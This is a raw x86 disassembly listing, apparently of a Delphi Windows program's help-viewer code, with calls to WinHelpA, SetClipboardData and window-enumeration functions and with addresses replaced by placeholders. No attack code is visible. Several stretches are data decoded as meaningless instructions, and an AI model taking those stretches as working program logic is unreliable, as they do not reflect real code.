mov eax [ ebp - 0x10 ]
push eax
push 0x9
call SetClipboardData
sub_43b60c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
xor eax eax
push ebp
push sub_43b681
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_43b260
xor eax eax
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0xa ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x60 ]
mov eax [ ebp - 0x8 ]
push eax
movzx eax [ ebp - 0xa ]
push eax
call SetClipboardData
cmp [ ebp - 0x10 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43b688
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
retn
mov eax [ ebp - 0x10 ]
push eax
push 0x9
call SetClipboardData
sub_43b690
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_43b588
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_416a84
mov edx ebx
mov eax esi
call sub_43b60c
jmp r-xdata
pop esi
pop ebx
retn
sub_43b6fc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_43b726
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43b72b
mov eax [ rw-data ]
cmp [ eax + 0x2 ] 0x0
je r-xdata
call sub_403eb4
mov ebx [ rw-data ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x4 ]
call [ ebx ]
jmp r-xdata
call sub_403f08
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43b758
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_43b789
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43b790
retn
mov eax [ rw-data ]
call sub_4036c0
sub_43b856
inc eax
add [ eax - 0x1e ] ch
inc ecx
add [ ecx + edi ] bl
inc eax
add [ eax ] dl
cmp [ eax ] eax
pop eax
inc eax
add [ esi + esi + 0x40 ] dh
add [ edx + 0x44 ] ah
add [ edx - 0x1ae3ffbc ] dh
inc ecx
add [ edx + ebp * 2 - 0x1a0bffbf ] al
inc ecx
add [ eax - 0x15 ] dh
inc ecx
add [ ebx + ebx * 8 - 0x187fffbc ] bl
inc esp
add [ ecx + ebp * 8 ] ch
inc ecx
add [ esi ] dl
inc ecx
add [ esi ] cl
inc ecx
add [ ecx + ebp * 8 ] dh
inc ecx
add [ eax ] bl
mov ecx 0xec300043
inc ecx
add ah dl
jmp r-xdata
add [ eax + eax ] al
or [ ebx + 0x74 ] dl
inc ecx
arpl [ esi + ebp * 2 + 0x73 ] si
add [ eax ] eax
lodsb [ esi ]
adc [ eax ] al
jl r-xdata
add bh bh
add dh ah
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x48040003 ] al
imul ebp [ esi + 0x74 ] 0x5300408d
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_44e210
mov [ esi + 0x60 ] 0x0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403a24
mov eax esi
pop esi
pop ebx
retn
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
sub_43b918
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_44e210
mov [ esi + 0x60 ] 0x0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403a24
mov eax esi
pop esi
pop ebx
retn
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
sub_43b954
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_43b979
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43b980
retn
sub_43ba1c
std
mov ecx 0xba070043
inc ebx
add [ ecx ] dl
mov edx 0xb9b50043
inc ebx
add [ ebp - 0x3affbc47 ] bh
mov ecx 0xb9cd0043
inc ebx
add ch dl
mov ecx 0xb9dd0043
inc ebx
add ch ah
mov ecx 0xb9ed0043
inc ebx
add ch dh
mov ecx 0xb9950043
inc ebx
add [ ebp - 0x5affbc47 ] bl
mov ecx 0xb9ad0043
inc ebx
add [ ebp + 0x30043b9 ] cl
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
pop es
mov edx 0xba110043
inc ebx
add [ ebp - 0x42ffbc47 ] dh
mov ecx 0xb9c50043
inc ebx
add ch cl
mov ecx 0xb9d50043
inc ebx
add ch bl
mov ecx 0xb9e50043
cmp bl [ edx + edi * 4 ]
inc ebx
add [ eax ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi - 0x6d ] ah
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
inc ebx
add ch ch
mov ecx 0xb9f50043
inc ebx
add [ ebp - 0x62ffbc47 ] dl
mov ecx 0xb9a50043
inc ebx
add [ ebp - 0x72ffbc47 ] ch
mov ecx 0x30043
add [ eax ] al
xchg bx ax
fnstsw [ ecx - 0x461affbd ]
cmp bl [ edx + edi * 4 ]
inc ebx
add [ eax ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + edx * 4 - 0x4 ] ah
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
add [ eax ] al
add [ esi - 0x6d ] ah
lodsd [ esi ]
mov ecx 0xb98d0043
inc ebx
add [ ebx ] al
cmp bl [ edx + edi * 4 ]
inc ebx
add [ eax ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + edi * 4 ] al
inc ebx
add [ eax - 0x46 ] ah
inc ebx
add [ eax ] al
add [ eax ] al
add [ ebx + edi * 4 ] al
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] bl
mov ebx 0x240043
add [ eax ] al
enter 0x4011 0x0
or [ ecx ] bh
inc eax
add [ eax ] dl
bound eax [ eax ]
sbb al 0x62
inc eax
add [ ecx + edi ] bl
inc eax
add [ eax ] dl
cmp [ eax ] eax
sub al 0x62
inc eax
add [ esi + esi + 0x40 ] dh
add [ eax - 0x3b ] dl
inc ebx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + edx + 0x140040 ] ch
add [ eax ] al
aam 0xa0
inc edx
add [ eax + eax ] bl
add [ eax ] al
push cs
push esp
push edi
imul ebp [ esi + 0x48 ] 0x56706c65
imul esp [ ebp + 0x77 ] 0x408d7265
add [ ebx + 0x56 ] dl
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403690
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403a24
mov eax esi
pop esi
pop ebx
retn
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
sub_43bb30
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403690
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403a24
mov eax esi
pop esi
pop ebx
retn
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
sub_43bb68
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_43bbe8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_40442c
test edi edi
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx edi
call sub_4044c4
cmp [ ebx + 0x1c ] 0x0
je r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_404480
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43bbef
lea eax [ ebp - 0x4 ]
call sub_40442c
retn
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
sub_43bbf8
push ebx
mov ebx eax
mov eax ebx
call sub_43bf10
cmp [ ebx + 0x1c ] 0x0
je r-xdata
pop ebx
retn
mov edx [ ebx + 0xc ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
cmp [ ebx + 0x1c ] 0x0
je r-xdata
lea eax [ ebx + 0x1c ]
call sub_406194
sub_43bc38
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_43bc9f
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov ebx 0x1
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax ebx
call sub_43bb68
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx + 0xc ]
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
mov ebx 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43bca6
lea eax [ ebp - 0x4 ]
call sub_40442c
retn
sub_43bcb0
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_43bd38
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403690
mov ebx eax
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_43bc24
push [ ebp - 0x8 ]
push r-xdata
push edi
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_4047a4
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx edi
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43bd3f
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404450
retn
sub_43bd4b
inc [ edx ]
add [ eax ] al
add [ edx ] bh
and [ eax ] al
add [ eax + 0x5590c301 ] dh
mov ebp esp
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_43bdd3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_43c46c
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43bdda
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404450
retn
mov [ ebx + 0x10 ] 0x2
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x8 ]
lea ecx [ ebp - 0x4 ]
mov eax ebx
call sub_43bb68
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push 0x0
push 0x3
mov eax [ ebp - 0x4 ]
call sub_4048dc
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_43bd58
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_43bdd3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_43c46c
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43bdda
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404450
retn
mov [ ebx + 0x10 ] 0x2
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x8 ]
lea ecx [ ebp - 0x4 ]
mov eax ebx
call sub_43bb68
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push 0x0
push 0x3
mov eax [ ebp - 0x4 ]
call sub_4048dc
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_43bde0
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_43bebe
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x14 ] 0xb
lea ecx [ ebp - 0x1c ]
xor edx edx
mov eax ebx
call sub_43bb68
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov ecx 0x1
mov eax r-xdata
call sub_409730
mov eax ebx
call sub_43c46c
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43bec5
lea eax [ ebp - 0x1c ]
call sub_40442c
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404450
retn
lea ecx [ ebp - 0x8 ]
xor edx edx
mov eax ebx
call sub_43bb68
push 0x0
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax ebx
call sub_43c3bc
test al al
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov [ ebx + 0x10 ] 0x1
lea eax [ ebx + 0x14 ]
mov edx [ ebp - 0x4 ]
call sub_404480
mov eax [ ebp - 0x4 ]
call sub_4048dc
push eax
push 0x102
mov eax [ ebp - 0x8 ]
call sub_4048dc
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_43bf2c
push ebx
mov ebx eax
mov eax ebx
call sub_43bf10
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea eax [ ebx + 0x1c ]
call sub_406194
pop ebx
retn
mov eax rw-data
call sub_406194
sub_43bf5c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_43bfb4
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43bfbb
lea eax [ ebp - 0x4 ]
call sub_40442c
retn
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax esi
call sub_43bb68
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov ebx eax
sub_43bfc4
push ebp
mov ebp esp
add esp 0xfffffef0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x110 ] ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_43c0ba
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x10c ] esi
mov [ ebp - 0x108 ] 0xb
lea eax [ ebp - 0x10c ]
push eax
push 0x0
mov ecx r-xdata
lea eax [ ebp - 0x104 ]
mov edx 0xff
call sub_4096f0
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax ebx
call sub_43bb68
mov eax ebx
call sub_43c46c
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43c0c1
lea eax [ ebp - 0x110 ]
call sub_40442c
lea eax [ ebp - 0x4 ]
call sub_40442c
retn
push 0x0
lea eax [ ebp - 0x110 ]
lea edx [ ebp - 0x104 ]
mov ecx 0x100
call sub_404694
mov ecx [ ebp - 0x110 ]
mov dl 0x1
mov eax ebx
call sub_43c3bc
test al al
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov [ ebx + 0x10 ] 0x1
lea eax [ ebx + 0x14 ]
lea edx [ ebp - 0x104 ]
mov ecx 0x100
call sub_404694
lea eax [ ebp - 0x104 ]
push eax
push 0x102
mov eax [ ebp - 0x4 ]
call sub_4048dc
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_43c0d8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_43c13a
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43c141
lea eax [ ebp - 0x8 ]
call sub_40442c
retn
lea ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_43bb68
mov ecx [ ebp - 0x8 ]
mov edx edi
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov ebx eax
sub_43c14c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_43c1cc
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
call sub_43bb68
mov eax ebx
call sub_43c46c
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43c1d3
lea eax [ ebp - 0x4 ]
call sub_40442c
retn
push esi
xor ecx ecx
xor edx edx
mov eax ebx
call sub_43c3bc
test al al
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov [ ebx + 0x10 ] 0x0
mov [ ebx + 0x18 ] esi
push esi
push 0x1
mov eax [ ebp - 0x4 ]
call sub_4048dc
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_43c1dc
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov edi [ ebp + 0xc ]
xor eax eax
push ebp
push sub_43c2d8
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x9 ] 0x0
xor ebx ebx
mov eax esi
call sub_43c46c
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43c2df
lea eax [ ebp - 0x18 ]
mov edx 0x3
call sub_404450
retn
cmp di 0x102
je r-xdata
push 0x0
lea edx [ ebp - 0x10 ]
movzx eax di
call sub_408a8c
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax esi
call sub_43c3bc
test al al
je r-xdata
cmp di 0x105
je r-xdata
test bl bl
je r-xdata
mov bl 0x1
jmp r-xdata
cmp di 0x201
je r-xdata
mov [ esi + 0x10 ] 0x1
lea edx [ ebp - 0x14 ]
movzx eax di
call sub_408a8c
mov edx [ ebp - 0x14 ]
lea eax [ esi + 0x14 ]
call sub_404480
mov eax [ ebp + 0x8 ]
push eax
movzx eax di
push eax
lea ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_43bb68
mov eax [ ebp - 0x18 ]
call sub_4048dc
push eax
mov eax [ ebp - 0x4 ]
push eax
call WinHelpA
cmp eax 0x1
sbb eax eax
inc eax
mov [ ebp - 0x9 ] al
cmp di 0xa
je r-xdata
cmp di 0x8
je r-xdata
cmp di 0x1
je r-xdata
cmp di 0x101
jne r-xdata
mov bl 0x1
sub_43c2ec
push ebp
mov ebp esp
add esp 0xffffff00
push ebx
push esi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
push 0x100
lea eax [ ebp - 0x100 ]
push eax
push esi
call GetClassNameA
mov edx r-xdata
lea eax [ ebp - 0x100 ]
call sub_4090bc
test eax eax
jne r-xdata
mov al [ ebx + 0xc ]
xor al 0x1
neg al
sbb eax eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov [ ebx + 0x4 ] esi
mov [ ebx + 0xc ] 0x1
sub_43c347
add [ ebp - 0x75 ] dl
in al dx
add esp 0xffffff00
push ebx
push esi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
push 0x100
lea eax [ ebp - 0x100 ]
push eax
push esi
call GetClassNameA
mov edx r-xdata
lea eax [ ebp - 0x100 ]
call sub_409098
test eax eax
jne r-xdata
mov al [ ebx + 0xd ]
xor al 0x1
neg al
sbb eax eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov [ ebx + 0xd ] 0x1
mov [ ebx + 0x8 ] esi
sub_43c3bc
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x1 ] dl
mov esi eax
mov eax [ ebp - 0x8 ]
call sub_4048cc
xor eax eax
push ebp
push sub_43c436
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
lea eax [ ebp - 0x18 ]
call sub_43c3a0
cmp [ ebp - 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43c43d
lea eax [ ebp - 0x8 ]
call sub_40442c
retn
mov al [ ebp - 0x1 ]
cmp al [ esi + 0x10 ]
jne r-xdata
mov al [ ebp - 0x1 ]
sub al 0x1
jb r-xdata
mov eax [ ebp + 0x8 ]
cmp eax [ esi + 0x18 ]
jne r-xdata
jne r-xdata
xor ebx ebx
mov edx [ esi + 0x14 ]
mov eax [ ebp - 0x8 ]
call sub_408698
test eax eax
jne r-xdata
xor ebx ebx
jmp r-xdata
sub_43c44c
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor eax eax
cmp [ esp + 0xd ] 0x0
jne r-xdata
add esp 0x10
pop edi
pop esi
retn
mov al 0x1
sub_43c46c
push ebx
push esi
add esp 0xfffffff0
mov esi eax
xor ebx ebx
cmp [ esp + 0xc ] 0x0
je r-xdata
mov edx esp
mov eax esi
call sub_43c448
test al al
jne r-xdata
mov eax esp
push eax
push r-xdata
push 0x0
mov eax [ esp + 0x10 ]
push eax
call __imp_GetWindowThreadProcessId
push eax
call EnumThreadWindows
mov eax ebx
add esp 0x10
pop esi
pop ebx
retn
mov edx esp
mov eax esi
call sub_43c44c
test al al
je r-xdata
mov bl 0x1
mov eax esi
call sub_43c4c4
sub_43c4c4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi eax
xor eax eax
push ebp
push sub_43c541
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_43bf10
call GetTickCount
mov ebx eax
push 0x0
call sub_406bf4
call GetTickCount
sub eax ebx
cmp eax 0x3e8
jbe r-xdata
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax esi
call sub_43bb68
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43c548
lea eax [ ebp - 0x4 ]
call sub_40442c
retn
push 0x0
push 0x9
mov eax [ ebp - 0x4 ]
call sub_4048dc
push eax
mov eax [ esi + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_43c550
push ebx
push esi
call sub_403a8c
mov ebx edx
mov esi eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4036b0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403a74
sub_43c578
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_43c5db
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43c5e2
retn
mov eax [ rw-data ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_43bbf8
mov eax rw-data
call sub_40442c
mov eax rw-data
call sub_406194
mov eax rw-data
call sub_406194
sub_43c5e4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_43c647
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43c64e
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_43bb30
mov [ rw-data ] eax
mov eax [ rw-data ]
add eax 0x1c
call sub_406194
mov edx eax
mov eax [ rw-data ]
test eax eax
je r-xdata
call sub_42a374
mov eax rw-data
call sub_406194
sub eax 0xffffffe0
sub_43c654
add [ edi ] eax
push esp
inc ebx
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor al 0xc7
jae r-xdata
inc ebx
add [ ecx + esi * 8 + 0x43 ] al
add [ ecx + esi * 8 - 0xd07ffbd ] ah
inc ebx
add ah bh
inc ebx
add [ ebx + esi * 8 ] al
inc ebx
add [ 0x61724454 ] cl
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebp + eax * 2 + 0x78 ] si
mov eax eax
or al 0xc8
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bh
enter 0x43 0x3c
add [ eax ] al
add ah al
mov [ ebx ] 0x8
cmp [ eax ] eax
inc ebx
add [ ebx + esi * 8 + 0x43 ] dl
add [ ecx + edi ] bl
inc eax
add [ eax ] dl
cmp [ eax ] eax
pop eax
inc eax
add [ esi + esi + 0x40 ] dh
add [ eax - 0xbffbfca ] dh
inc ebx
add al ah
inc ebx
add ah bl
inc ebx
add al ah
int1
inc ebx
add [ ebx + esi * 8 - 0xe5bffbd ] bl
inc ebx
add al bh
inc ebx
add ah bh
inc ebx
add [ ebx + esi * 8 ] al
inc ebx
add al cl
inc ebx
add [ eax - 0xd ] bh
inc ebx
add [ esi ] dl
push esp
inc edx
popad
jae r-xdata
dec edi
bound ebp [ edx + 0x65 ]
arpl [ esp + ecx * 4 - 0x39 ] si
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x380043c7 ] dh
add [ eax ] al
add ah al
mov [ ebx ] 0x8
cmp [ eax ] eax
inc ebx
add [ ebx + esi * 8 + 0x43 ] dh
add [ ecx + edi ] bl
inc eax
add [ eax ] dl
cmp [ eax ] eax
pop eax
inc eax
add [ esi + esi + 0x40 ] dh
add [ eax - 0x63ffbfca ] dh
int1
inc ebx
add al ah
inc ebx
add ah bl
inc ebx
add al ah
int1
inc ebx
add [ eax + eax ] dh
add [ eax ] al
fcom [ eax ]
inc eax
add [ eax ] cl
cmp [ eax ] eax
inc ebx
add [ ebx + esi * 8 + 0x43 ] dl
add [ ecx + edi ] bl
inc eax
add [ eax ] dl
cmp [ eax ] eax
pop eax
inc eax
add [ esi + esi + 0x40 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + eax * 8 ] dh
jb r-xdata
add [ eax - 0xc ] al
inc ebx
add al ah
int1
inc ebx
add [ ebx + esi * 8 - 0xe5bffbd ] bl
inc ebx
add [ esp + esi * 8 + 0x43 ] cl
add ah bh
inc esp
jb r-xdata
add [ eax + 0x7fffffff ] al
add [ eax ] al
mov eax eax
insb
mov [ ebx ] 0x3
push es
push esp
inc ecx
insb
imul esp [ edi + 0x6e ] 0x1
add [ esi ] al
add [ eax ] al
add [ eax - 0x3a ] ch
inc ebx
add [ esi ] al
popad
insb
dec esi
outsd
outsb
add eax 0x6f546c61
jo r-xdata
inc ebx
add [ eax - 0xc ] al
inc ebx
add al ah
int1
inc ebx
add [ ebx + esi * 8 - 0xe5bffbd ] bl
inc ebx
add [ esp + esi * 8 + 0x43 ] cl
add ah bh
inc ebx
outsd
outsb
je r-xdata
inc ebx
inc ebx
outsd
outsb
